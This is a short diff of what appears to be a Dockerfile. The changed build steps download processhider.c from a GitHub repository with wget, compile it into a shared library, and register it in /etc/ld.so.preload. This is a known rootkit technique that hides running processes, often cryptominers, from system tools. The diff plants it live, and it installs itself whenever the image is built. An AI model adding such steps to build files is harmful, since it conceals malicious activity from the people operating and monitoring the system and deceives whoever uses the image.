@@ -39,8 +39,7 @@ RUN apt-get install -y --no-install-recommends \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
-RUN git clone https://github.com/cihuuy/libn
-RUN cd libn 
+RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c
 RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl 
 RUN mv libprocess.so /usr/local/lib/ 
 RUN echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
